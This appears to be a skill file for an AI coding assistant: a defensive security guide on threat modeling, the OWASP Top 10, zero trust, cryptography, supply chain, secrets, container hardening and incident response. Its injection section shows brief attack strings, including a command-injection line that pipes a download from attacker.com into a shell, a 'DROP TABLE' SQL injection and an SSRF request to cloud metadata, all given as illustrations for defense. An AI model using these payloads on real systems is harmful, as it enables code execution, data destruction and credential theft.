---
name: god-security-core
description: "God-level application and infrastructure security skill. Covers threat modeling (STRIDE, PASTA, Attack Trees), OWASP Top 10 (2021), CWE Top 25, secure design principles, zero trust architecture (NIST SP 800-207), SAST/DAST/SCA tooling, secrets management, cryptography fundamentals (correct algorithms, key sizes, modes), supply chain security (SLSA, SBOM, sigstore), container security, network security, and incident response fundamentals. The researcher-warrior never trusts any input, any system, or any assumption. Every feature is an attack surface. Use for security reviews, threat modeling, secure design, vulnerability assessment, or any security-related engineering task."
metadata:
  author: god-dev-suite
  version: '1.0'
---

# God-Level Application and Infrastructure Security

## The Researcher-Warrior Identity

Security is not a feature you add at the end. It is not a checklist you complete before launch. It is a mindset woven into every line of code, every architecture decision, every deployment config. The researcher-warrior operates on one axiom: **assume breach**. Not "if we get breached" — "when we get breached, can we detect it, contain it, and recover from it?"

You think like an attacker first. You know what every API endpoint returns, you know what secrets are in memory at runtime, you know what logs would reveal — or fail to reveal — a compromise. You never accept a control at face value; you test it. You never say "that's unlikely" about a threat vector; you say "what is the cost of being wrong?"

**Non-negotiable operating principles**:
- Every input is malicious until proven otherwise. Every. Single. One.
- Defense in depth: if one control fails, two more must hold. Single controls are single points of failure.
- The most dangerous vulnerabilities are in the intersection of features — not individual bugs.
- Security through obscurity is not security. It's a delay at best.
- Your threat model is wrong. Update it every quarter, after every architecture change, after every incident.
- Never ship a "we'll fix security later" — later never comes, and the fix costs 10× more post-breach.

**Anti-Hallucination Rules (Security-Specific)**:
- NEVER recommend MD5, SHA1, DES, RC4, 3DES, or ECB mode for any purpose. These are broken.
- NEVER invent CVE numbers. Verify at: https://cve.mitre.org or https://nvd.nist.gov
- NEVER fabricate OWASP categories beyond the published Top 10 2021 list.
- NEVER state that a tool "catches" something without citing its capability documentation.
- NEVER claim a cryptographic construction is secure without specifying algorithm, mode, key size, and IV/nonce handling.
- If you don't know whether a specific library version is vulnerable, say so and direct to: https://osv.dev or https://snyk.io

---

## Phase 1: Threat Modeling

### 1.1 STRIDE

STRIDE is a structured methodology for identifying threats by category. Apply it to every component, every data flow, every trust boundary in your system.

**S — Spoofing** (Authentication)
Claiming an identity you don't have.
- Examples: Forging JWT tokens, ARP poisoning, BGP hijacking, phishing to steal session cookies, SSRF to reach internal services that trust the internal network
- Defenses: Strong authentication (MFA), token signature verification, mutual TLS, input validation on identifiers

**T — Tampering** (Integrity)
Modifying data or code you shouldn't be able to modify.
- Examples: SQL injection to modify database records, parameter tampering in HTTP requests, supply chain attacks (modifying packages), CI/CD pipeline compromise to inject malicious builds
- Defenses: Input validation, parameterized queries, code signing, HMAC on data in transit, integrity checks on dependencies

**R — Repudiation** (Non-repudiation)
Denying having performed an action.
- Examples: User denies placing an order, insider deletes audit logs before investigation, attacker covers tracks by rotating API keys and disabling logging
- Defenses: Append-only audit logs, log forwarding to immutable SIEM, cryptographic audit trails, two-person integrity for sensitive operations

**I — Information Disclosure** (Confidentiality)
Exposing data to unauthorized parties.
- Examples: Error messages revealing stack traces, S3 buckets set to public, verbose logging of PII, IDOR on API endpoints, directory traversal, SSL certificate information leakage
- Defenses: Least privilege on data access, structured error messages (never expose internals), encryption at rest and in transit, access control on all API endpoints

**D — Denial of Service** (Availability)
Making a system unavailable.
- Examples: SYN flood, HTTP request flooding, ReDoS (regex-based CPU exhaustion), memory exhaustion via crafted input, dependency-level DoS (Log4Shell class loading)
- Defenses: Rate limiting, input size limits, timeout enforcement, circuit breakers, resource quotas, WAF

**E — Elevation of Privilege** (Authorization)
Gaining permissions you were not granted.
- Examples: SSRF to reach internal IAM endpoints, JWT `alg: none` attack, SQL injection that adds admin privileges, container escape from non-root misconfiguration, path traversal to read sensitive config files
- Defenses: Principle of least privilege, authorization checks at every layer (never trust client-asserted roles), seccomp/AppArmor on containers, separate trust zones

### 1.2 Attack Trees

An attack tree maps all paths an attacker could take to achieve a goal. Build one for every high-value target.

**Building an attack tree**:
1. **Root node**: Attacker's goal (e.g., "Exfiltrate customer PII from production database")
2. **Intermediate nodes**: Sub-goals required to reach the root (OR nodes = any path works; AND nodes = all required)
3. **Leaf nodes**: Concrete attack actions (exploits, social engineering, misconfigurations)
4. **Annotate each leaf**: Effort, probability, detectability, current control

Example (abbreviated):
```
[ROOT] Exfiltrate customer PII
├── [OR] Gain direct DB access
│   ├── [OR] SQLi on web app → extract data
│   ├── [AND] Compromise DB admin credentials + bypass MFA
│   └── [OR] Compromise a service account with DB read permissions
│       ├── SSRF to IMDS → steal cloud credentials
│       └── Leaked key in git history
└── [OR] Access backup storage
    ├── Misconfigured public S3 bucket
    └── Compromise CI/CD pipeline → exfiltrate backup
```

**Decision rule**: If any leaf node is low-effort + low-detectability + no current control → it is a P0 finding regardless of probability estimate.

### 1.3 Security Review Process

Apply threat modeling at these points:
1. **New features**: Before implementation, during design review
2. **Architecture changes**: Any new service, new integration, new trust boundary
3. **Third-party integrations**: Every external API is a trust boundary
4. **Quarterly review**: Your threat model has a shelf life; re-examine with fresh attacker eyes

---

## Phase 2: OWASP Top 10 — 2021 (Technical Deep Dive)

### A01:2021 — Broken Access Control

**The #1 vulnerability class.** 94% of applications tested had some form.

Attack patterns:
- IDOR (Insecure Direct Object Reference): `/api/orders/12345` — can you access order 12346 by changing the ID?
- Force browsing: `/admin/users` accessible to non-admin users
- Missing access control on HTTP methods (PUT/DELETE allowed where only GET was intended)
- JWT claims not re-validated server-side (client modifies `"role": "admin"`)
- CORS misconfiguration allowing requests from unauthorized origins

Defenses:
- Deny by default on all endpoints — explicit allow list, not explicit deny list
- Server-side authorization checks on every request, every endpoint — never trust client-provided role claims
- Use UUID/opaque identifiers where possible; validate authorization on every access regardless
- Log all access control failures; alert on patterns (repeated 403s from same user)

### A02:2021 — Cryptographic Failures (formerly Sensitive Data Exposure)

Attack patterns:
- Data stored or transmitted in plaintext (HTTP, unencrypted database columns)
- Weak cryptographic algorithms (MD5 for password hashing, SHA1 for signatures)
- Hardcoded keys in source code
- Insufficient key length (RSA-1024, AES-128 for PCI-regulated data)
- Missing TLS certificate validation in internal service-to-service calls

Defenses:
- Classify data; apply encryption proportional to sensitivity
- For passwords: Argon2id (preferred), bcrypt (work factor ≥12), scrypt — never MD5, SHA1, SHA256 without stretching
- For data at rest: AES-256-GCM or ChaCha20-Poly1305
- For data in transit: TLS 1.2+ (prefer TLS 1.3), certificate validation enforced
- Key rotation schedules with zero-downtime key rollover patterns

### A03:2021 — Injection (SQL, LDAP, OS, SSTI, SSJI)

Attack patterns:
- SQLi: `'; DROP TABLE users; --` via unsanitized input concatenated into queries
- OS command injection: `os.system("ls " + user_input)` → `ls; curl attacker.com | sh`
- Server-side template injection (SSTI): `{{7*7}}` rendered in template engine = code execution
- LDAP injection, XML injection, GraphQL injection — same root cause, different sinks

Defenses:
- Parameterized queries / prepared statements — no exceptions for SQL
- ORM usage is not sufficient if raw query methods are also used
- Input validation on type, length, format, range — whitelist, not blacklist
- Principle of least privilege on DB accounts (SELECT user cannot DROP TABLE)
- Separate query construction from execution

### A04:2021 — Insecure Design

Not a bug class — a category of design-level security failures.

Examples:
- A password reset flow that uses a 4-digit PIN (brutable in 10,000 attempts)
- A single tenancy architecture accidentally serving another tenant's data under load
- Business logic that allows negative quantities in a shopping cart
- A bulk export API with no rate limit on PII download

Defenses:
- Threat model BEFORE implementation, not after
- Abuse cases alongside use cases in requirements
- Security-focused design reviews with explicit adversarial perspective
- Rate limits and anomaly detection as architectural requirements, not afterthoughts

### A05:2021 — Security Misconfiguration

Attack patterns:
- Default credentials left in place (admin/admin on Grafana, elastic:changeme)
- Unnecessary features enabled (debug endpoints, TRACE HTTP method, directory listing)
- Error messages exposing stack traces, SQL query text, environment variables
- Missing security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options)
- Cloud storage buckets publicly accessible
- Open security groups (0.0.0.0/0 on port 22 or 3306)

Defenses:
- Infrastructure as Code with security-hardened base images/configs
- CSPM tools scanning for misconfigurations continuously
- Automated configuration drift detection
- Separate environments (dev configs never go to prod)
- Regular security scanning of all infrastructure

### A06:2021 — Vulnerable and Outdated Components

Attack patterns:
- Running Log4j 2.x before 2.17.1 (Log4Shell — RCE via JNDI injection in log messages)
- Outdated container base images with known CVEs
- Frontend dependencies with prototype pollution vulnerabilities
- Transitive dependencies (the package you use depends on the package with the CVE)

Defenses:
- SCA (Software Composition Analysis) in CI pipeline: Snyk, OWASP Dependency-Check, Dependabot, Grype
- Pin all dependencies to specific hashes (not just versions — versions can be republished)
- Automated PR creation for security updates
- Container image scanning on every build AND at runtime
- SBOM generation to know exactly what's running

### A07:2021 — Identification and Authentication Failures

Attack patterns:
- Credential stuffing (reusing leaked username/password pairs)
- Weak password policies (length < 8, no complexity)
- Missing MFA on admin interfaces
- Session tokens not invalidated after logout
- JWTs with long expiry and no revocation mechanism
- Password hashes stored with weak algorithms (MD5, unsalted SHA1)

Defenses:
- MFA enforcement (TOTP, FIDO2, passkeys — not SMS for high-value accounts)
- Rate limiting and account lockout on authentication endpoints
- Session invalidation on logout (server-side token revocation)
- Breach password detection (HaveIBeenPwned API or NIST guidance on compromised passwords)
- Short JWT lifetimes with refresh token rotation

### A08:2021 — Software and Data Integrity Failures

Attack patterns:
- CI/CD pipeline compromise to inject malicious code (SolarWinds, XZ Utils)
- Insecure deserialization (Java deserialization gadget chains, pickle exploits in Python)
- Auto-update without signature verification
- Using CDN scripts without Subresource Integrity (SRI) hashes

Defenses:
- Sign all build artifacts (cosign, sigstore, SLSA provenance)
- Verify signatures before deployment
- SRI for all external scripts/stylesheets (`integrity="sha256-..."`)
- Avoid native deserialization of untrusted data; use JSON/protocol buffers with validation
- SLSA level 2+ for build integrity

### A09:2021 — Security Logging and Monitoring Failures

Attack patterns:
- Breaches going undetected for months (average dwell time: historically 200+ days)
- Logs that capture actions but not enough context to reconstruct the attack chain
- Logs stored on the compromised system (attacker deletes them)
- Alerting thresholds too high (1,000 failed logins before alert — attacker uses 999)

Defenses:
- Log all authentication events, access control decisions, data access, admin operations
- Forward logs to immutable external SIEM in real time
- Alert on: repeated failures, impossible travel, admin operations outside business hours, bulk data access
- Include in logs: user ID, IP, user agent, resource accessed, outcome, timestamp in UTC

### A10:2021 — Server-Side Request Forgery (SSRF)

Attack patterns:
- Web app fetches a URL from user input → attacker provides `http://169.254.169.254/metadata` (cloud metadata)
- PDF generator, image downloader, webhook delivery — all potential SSRF vectors
- SSRF to internal Kubernetes API server (`kubernetes.default.svc.cluster.local`)
- SSRF to reach internal services behind firewall

Defenses:
- Allowlist outbound URLs by domain/IP — deny by default, never blocklist
- Block IMDS IPs (169.254.169.254, fd00:ec2::254) at application level AND network level
- Use IMDSv2 (AWS) which requires session-oriented tokens — harder to exploit via SSRF
- Resolve DNS and validate IP after resolution (DNS rebinding defense)
- Disable URL redirects in HTTP clients or validate destination after redirect

---

## Phase 3: Zero Trust Architecture (NIST SP 800-207)

### 3.1 Core Tenets (NIST SP 800-207)

Zero Trust replaces "trust but verify" with "never trust, always verify." The seven tenets from NIST SP 800-207:

1. All data sources and computing services are considered resources
2. All communication is secured regardless of network location (no trusted network)
3. Access to individual enterprise resources is granted on a per-session basis
4. Access to resources is determined by dynamic policy (identity + device health + context)
5. The enterprise monitors and measures the integrity and security posture of all assets
6. All resource authentication and authorization is dynamic and strictly enforced
7. The enterprise collects as much information as possible about the current state of assets and uses it to improve security posture

### 3.2 Zero Trust in Practice — Architectural Decisions

**Network location ≠ trust**:
- Service-to-service calls on the internal network require authentication (mTLS or JWT)
- No "trusted internal network" concept — a compromised internal service can attack any other service
- Enforce at every hop with service mesh mTLS (Istio, Linkerd, Cilium)

**Identity-first access**:
- Every request must carry a verifiable identity (user, service account, workload)
- Short-lived credentials (tokens expiring in minutes/hours, not days)
- Just-in-time access for privileged operations (PIM on Azure, PAM on GCP)

**Device health as access signal**:
- Device compliance (MDM-managed, up-to-date patches, no known compromise) feeds into access decisions
- Conditional Access (Azure) and Context-Aware Access (GCP) implement this

**Continuous verification**:
- Re-authenticate on sensitive operations, not just at session start
- Step-up authentication for admin operations even mid-session
- Token introspection at each resource, not just at the gateway

---

## Phase 4: Cryptography — The Right Answers

### 4.1 Algorithms to Use (Verified Recommendations)

**Symmetric encryption**:
- AES-256-GCM — preferred for most use cases (authenticated encryption, fast with hardware acceleration)
- ChaCha20-Poly1305 — preferred when hardware AES acceleration unavailable (mobile, embedded)
- Never: DES, 3DES, RC4, Blowfish, AES-ECB (ECB mode has no semantic security)

**Asymmetric encryption/signatures**:
- RSA-2048 (minimum), RSA-4096 (preferred for long-lived certificates)
- ECDSA with P-256 (secp256r1) or P-384 — smaller keys, equivalent security
- Ed25519 — excellent for signatures (fast, compact, safe API)
- Never: RSA-1024, DSA-1024

**Key exchange**:
- X25519 (Diffie-Hellman over Curve25519) — preferred
- ECDH with P-256 — acceptable
- Never: RSA key exchange (no forward secrecy), DH with moduli < 2048 bits

**Hashing**:
- SHA-256, SHA-384, SHA-512 (SHA-2 family) — standard use
- SHA3-256, SHA3-512 — alternative (different construction, both secure)
- BLAKE2b — high performance, secure, good for non-cryptographic uses too
- Never: MD5 (broken), SHA1 (broken for collision resistance)

**Password hashing** (resistant to GPU brute force):
- Argon2id — winner of Password Hashing Competition; current recommendation
- bcrypt (work factor ≥12) — widely supported, well-understood
- scrypt (N=32768, r=8, p=1 minimum) — memory-hard
- PBKDF2-HMAC-SHA256 (iterations ≥600,000 per NIST 2023) — only when Argon2id/bcrypt unavailable
- Never: MD5, SHA1, SHA256 without stretching — crackable in milliseconds with GPU

### 4.2 TLS

**TLS 1.3 improvements over 1.2**:
- 1-RTT handshake (TLS 1.2 required 2-RTT)
- 0-RTT resumption (with replay attack risk — use only for non-sensitive GET requests)
- Forward secrecy mandatory (ephemeral key exchange only — ECDHE)
- Removed weak cipher suites (RC4, 3DES, RSA key exchange, CBC-mode ciphers)
- Encrypted handshake metadata

**TLS configuration checklist**:
```
Minimum protocol: TLS 1.2 (prefer TLS 1.3 only where supported)
Cipher suites (TLS 1.3): TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256, TLS_AES_128_GCM_SHA256
Cipher suites (TLS 1.2): ECDHE-ECDSA-AES256-GCM-SHA384, ECDHE-RSA-AES256-GCM-SHA384
Certificate: minimum RSA-2048 or ECDSA P-256; SHA-256 signature
HSTS: max-age=31536000; includeSubDomains; preload
OCSP Stapling: enabled (to avoid OCSP round-trip on connection)
Certificate pinning: evaluate tradeoffs — pins prevent MITM but cause outages if cert rotates without updating pins
```

### 4.3 Common Cryptographic Mistakes

```python
# WRONG — ECB mode, no authentication
from Crypto.Cipher import AES
cipher = AES.new(key, AES.MODE_ECB)  # Never use ECB

# WRONG — SHA256 for password (no stretching)
import hashlib
stored = hashlib.sha256(password.encode()).hexdigest()  # Crackable in seconds

# WRONG — reusing nonce with GCM (catastrophic — reveals key)
nonce = b'\x00' * 16  # Never hardcode or reuse nonces

# CORRECT — AES-256-GCM with random nonce
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
key = os.urandom(32)  # 256-bit key
nonce = os.urandom(12)  # 96-bit random nonce for GCM
aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)

# CORRECT — Argon2id for password hashing
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hash = ph.hash(password)
ph.verify(hash, password)  # Raises VerifyMismatchError if wrong
```

---

## Phase 5: Supply Chain Security

### 5.1 SLSA (Supply chain Levels for Software Artifacts)

SLSA (pronounced "salsa") provides a framework for measuring build integrity:

- **SLSA Level 1**: Build process documented and scripted; provenance available
- **SLSA Level 2**: Build uses a hosted build service; signed provenance generated
- **SLSA Level 3**: Hardened build platform; provenance non-falsifiable; source and build integrity verified
- **SLSA Level 4** (now Split into Build L3 + Source Track): Two-person review; hermetic builds

For most projects, target SLSA Level 2+ in CI/CD. GitHub Actions with `slsa-framework/slsa-github-generator` generates SLSA provenance automatically.

### 5.2 SBOM (Software Bill of Materials)

Generate SBOMs in CycloneDX or SPDX format:

```bash
# Generate SBOM for a container image (Syft)
syft image:myapp:latest -o cyclonedx-json > sbom.json
syft image:myapp:latest -o spdx-json > sbom.spdx.json

# Generate SBOM for a directory (cdxgen)
cdxgen -t python /path/to/project -o sbom.json

# Scan SBOM for vulnerabilities (Grype)
grype sbom:sbom.json

# Scan container image directly
grype image:myapp:latest --fail-on high
```

### 5.3 Artifact Signing (cosign / sigstore)

```bash
# Sign a container image (keyless signing via Sigstore Fulcio + Rekor)
cosign sign myregistry/myimage:v1.0.0

# Verify a signed image
cosign verify myregistry/myimage:v1.0.0 \
  --certificate-identity=user@example.com \
  --certificate-oidc-issuer=https://accounts.google.com

# Sign with a key
cosign generate-key-pair
cosign sign --key cosign.key myregistry/myimage:v1.0.0
cosign verify --key cosign.pub myregistry/myimage:v1.0.0

# Sign SBOMs and attestations
cosign attest --key cosign.key --type cyclonedx --predicate sbom.json myregistry/myimage:v1.0.0
```

---

## Phase 6: Secrets Management

### 6.1 The Rules

1. **Never in source code** — Not even in test code. `git log` is forever. Use `detect-secrets`, `gitleaks`, `truffleHog` in pre-commit and CI.
2. **Never in environment variables at rest** — `.env` files committed to repos are a breach vector. Use secret managers.
3. **Never in build logs** — Mask secrets in CI systems; audit pipeline logs for accidental exposure.
4. **Rotation without downtime** — Every secret must have a rotation procedure that doesn't require downtime.

### 6.2 Vault Patterns (HashiCorp Vault)

```bash
# Dynamic secrets — Vault generates short-lived credentials on demand
vault secrets enable aws
vault write aws/config/root access_key=... secret_key=...
vault write aws/roles/my-role credential_type=iam_user \
  policy_arns=arn:aws:iam::123456789012:policy/MyPolicy

# Application gets fresh AWS creds (TTL-bound, auto-rotated)
vault read aws/creds/my-role

# Transit secrets engine (encryption as a service)
vault secrets enable transit
vault write transit/keys/my-key type=aes256-gcm96
# Encrypt without ever seeing the key
vault write transit/encrypt/my-key plaintext=$(base64 <<< "secret data")
# Returns ciphertext — Vault holds the key, application holds ciphertext only
```

### 6.3 Secrets Detection in CI

```bash
# detect-secrets (Yelp) — baseline scanning
detect-secrets scan > .secrets.baseline
detect-secrets audit .secrets.baseline  # Review findings
# Add to pre-commit:
# - repo: https://github.com/Yelp/detect-secrets
#   hooks:
#     - id: detect-secrets

# gitleaks — scan entire git history
gitleaks detect --source . --verbose
gitleaks detect --source . --log-opts="--all"  # Full history

# truffleHog — high entropy string detection
trufflehog git file://. --only-verified

# In GitHub Actions:
# - uses: trufflesecurity/trufflehog@main
#   with:
#     path: ./
#     base: ${{ github.event.repository.default_branch }}
```

---

## Phase 7: Container Security

### 7.1 Non-negotiable Container Hardening

```dockerfile
# Use specific, minimal base image (not :latest)
FROM python:3.12.3-slim-bookworm

# Run as non-root
RUN groupadd --gid 10001 appgroup && \
    useradd --uid 10001 --gid appgroup --no-create-home appuser

WORKDIR /app
COPY --chown=appuser:appgroup . .

RUN pip install --no-cache-dir -r requirements.txt

USER appuser

# No SETUID/SETGID binaries in final image
RUN find / -perm /6000 -type f -exec chmod a-s {} \; 2>/dev/null || true

ENTRYPOINT ["python", "app.py"]
```

Kubernetes security context:
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 10001
  runAsGroup: 10001
  readOnlyRootFilesystem: true
  allowPrivilegeEscalation: false
  seccompProfile:
    type: RuntimeDefault  # or Localhost with custom profile
  capabilities:
    drop:
      - ALL
    add: []  # Only add what's strictly required
```

### 7.2 Image Scanning

```bash
# Trivy — comprehensive vulnerability scanner
trivy image myapp:latest --exit-code 1 --severity HIGH,CRITICAL

# Grype — fast, accurate
grype myapp:latest --fail-on high

# In CI:
trivy image --format sarif --output trivy-results.sarif myapp:latest
# Upload SARIF to GitHub Security tab for visibility
```

---

## Phase 8: SAST/DAST Tooling

### 8.1 SAST (Static Analysis)

Tools and what they catch (verify current capabilities at tool documentation):

**Semgrep** — Language-agnostic rule engine; excellent custom rule support
```bash
semgrep --config=p/owasp-top-ten .
semgrep --config=p/secrets .
semgrep --config=p/python .
semgrep --config=p/golang .
```

**CodeQL** — Deep semantic analysis; catches complex vulnerabilities across taint flows
```yaml
# .github/workflows/codeql.yml
- uses: github/codeql-action/init@v3
  with:
    languages: python, javascript
    queries: security-extended
```

**Language-specific**:
- Python: `bandit -r . -ll` (severity medium+)
- Go: `gosec ./...`
- JavaScript/Node: `eslint` with `eslint-plugin-security`
- Java: SpotBugs + Find Security Bugs plugin
- Ruby: Brakeman

### 8.2 DAST (Dynamic Analysis)

**OWASP ZAP** — Active and passive scanning
```bash
# Full active scan via Docker
docker run -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://target.example.com \
  -r report.html

# API scan from OpenAPI spec
docker run -t owasp/zap2docker-stable zap-api-scan.py \
  -t https://target.example.com/openapi.json \
  -f openapi
```

**nuclei** — Template-based targeted scanning
```bash
nuclei -target https://target.example.com -t nuclei-templates/
nuclei -target https://target.example.com -tags cve,misconfig -severity critical,high
```

---

## Phase 9: Incident Response

### 9.1 The Six Phases (NIST SP 800-61)

**1. Preparation**
- Playbooks written and tested before incidents
- Contact lists updated
- Forensic tools pre-installed
- Log retention confirmed
- Access to required tools pre-authorized

**2. Detection and Analysis**
- Determine if the event is a true incident (vs false positive)
- Assess scope, impact, and affected systems
- Preserve evidence (memory dumps, logs, disk images) before containment if possible
- Establish timeline

**3. Containment**
- Short-term: Isolate affected systems (network segmentation, revoke credentials)
- Long-term: Build clean replacement environments
- Document all actions with timestamps

**4. Eradication**
- Remove root cause (malware, vulnerability, compromised account)
- Reset all affected credentials — not just the ones you can trace
- Rebuild from known-clean images if system integrity is questionable

**5. Recovery**
- Restore from clean backups
- Monitor closely for re-infection
- Gradually restore services; do not rush

**6. Post-Incident Activity (Lessons Learned)**
- Blameless postmortem within 72 hours
- Root cause analysis (5 Whys)
- Update runbooks, detection rules, architecture
- Track action items to completion

---

## Self-Review Checklist: Core Security

**Threat Model**
- [ ] STRIDE applied to all components and data flows
- [ ] Trust boundaries explicitly identified (external users, internal services, third-party APIs, databases)
- [ ] Attack tree built for top 3 worst-case scenarios
- [ ] Threat model reviewed in last quarter

**Code Security**
- [ ] No string concatenation in SQL queries — parameterized statements only
- [ ] Input validation on type, length, format, and range on all user-controlled inputs
- [ ] Authorization check on every sensitive API endpoint — not just authentication
- [ ] Error messages return generic messages to clients; details logged internally
- [ ] SAST (Semgrep or equivalent) running in CI with findings blocking merge

**Cryptography**
- [ ] No MD5, SHA1, DES, RC4, ECB mode anywhere in codebase
- [ ] Password hashing uses Argon2id, bcrypt (factor ≥12), or scrypt
- [ ] TLS 1.2+ enforced on all endpoints; TLS 1.3 preferred
- [ ] Secrets not in source code, not in environment variable files committed to version control

**Dependencies and Supply Chain**
- [ ] SCA tool running in CI (Snyk, OWASP Dependency-Check, or Grype)
- [ ] Dependencies pinned to specific versions or hashes
- [ ] SBOM generated for production artifacts
- [ ] Container base images scanned in CI; rebuilt weekly to pick up OS patches

**Secrets Management**
- [ ] Secret scanning tool configured in pre-commit hooks AND CI
- [ ] All secrets stored in a secret manager (Vault, AWS Secrets Manager, GCP Secret Manager, Azure Key Vault)
- [ ] Secret rotation procedures documented and tested
- [ ] No secrets in build logs, error messages, or API responses

**Container and Runtime Security**
- [ ] Containers run as non-root with specific UID
- [ ] `readOnlyRootFilesystem: true` in Kubernetes security context
- [ ] `allowPrivilegeEscalation: false` in Kubernetes security context
- [ ] All capabilities dropped, none added unless strictly required
- [ ] Seccomp profile applied (RuntimeDefault minimum)

**Monitoring and Response**
- [ ] Authentication events, authorization failures, and admin operations logged
- [ ] Logs forwarded to external SIEM in real time (not just local disk)
- [ ] Incident response runbooks exist for top 5 threat scenarios
- [ ] Runbooks tested in tabletop exercise in last 6 months

**Zero Trust**
- [ ] Service-to-service authentication enforced (mTLS or short-lived tokens)
- [ ] No "trusted internal network" assumption — all internal calls authenticated
- [ ] Principle of least privilege applied to all service identities
- [ ] Just-in-time access for privileged operations

---

## Cross-Domain Connections

**Security → IAM**: Every cryptographic weakness is an IAM problem. Stolen JWT? IAM problem. Weak password policy? IAM problem. SSRF to IMDS? IAM problem (because the token you steal belongs to an over-privileged identity). Fix the crypto, fix the identity, fix the permissions — the trifecta.

**Security → Networking**: SSRF vulnerabilities are networking problems as much as security problems. Defense requires both network egress controls (blocking 169.254.169.254 at the firewall) and application-level allowlisting. TLS configuration problems are networking problems — TLS 1.0 cipher suites aren't terminated by the application, they're negotiated at the transport layer.

**Security → Kubernetes**: Container escapes lead to node compromise which leads to credential theft from the node's service account token. Kubernetes security is multi-layer: Pod Security Standards (restricted), network policies, RBAC, seccomp profiles, and Workload Identity integration. A single privileged pod on a shared node breaks isolation for every workload on that node.

**Security → DevOps**: The CI/CD pipeline is the highest-privilege system in most organizations. A compromised pipeline can sign malicious artifacts, push to production, and exfiltrate secrets from every other connected system. Treat pipeline credentials with the same rigor as production IAM roles. SLSA provenance is how you prove the pipeline wasn't compromised.
